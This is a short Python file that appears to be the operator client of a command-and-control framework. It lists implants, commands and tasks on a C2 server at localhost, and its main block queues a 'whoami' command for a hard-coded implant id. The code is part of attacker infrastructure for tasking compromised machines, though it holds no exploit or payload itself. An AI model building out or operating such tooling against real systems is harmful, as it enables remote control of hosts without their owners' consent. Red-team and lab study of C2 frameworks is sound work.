import requests
from urllib.parse import urljoin


c2_url = "http://localhost:5000"

list_commands_path = "/admin/list/commands"
list_implants_path = "/admin/list/implants"

list_tasks_path = "/admin/list/tasks"

create_tasks_path = "/admin/create/task"


def list_implants():
    r = requests.get(urljoin(c2_url, list_implants_path))
    if r.status_code ==200:
        return r.json()
    print("Error:", r.status_code, r.content)
    return []

def list_tasks():
    r = requests.get(urljoin(c2_url, list_tasks_path))
    if r.status_code ==200:
        return r.json()
    print("Error:",r.url, r.status_code, r.content)
    return []

def list_commands():
    r = requests.get(urljoin(c2_url, list_commands_path))
    if r.status_code ==200:
        return r.json()
    print("Error:",r.url, r.status_code, r.content)
    return []

def make_task(implant_id:str, opcode:int, args:str ):
    data = {"implant_id":implant_id, "opcode": opcode, "args":args}
    r = requests.post(urljoin(c2_url, create_tasks_path), json=data)
    if r.status_code ==200:
        return r.json()
    print("Error:",r.url , r.status_code, r.content)
    return []

    
if __name__ == "__main__":
    implant_id = "18c39fa8eb8765c90ca17e7c876601c4"
    cmd = "whoami"
    print(make_task(implant_id, 1, cmd))

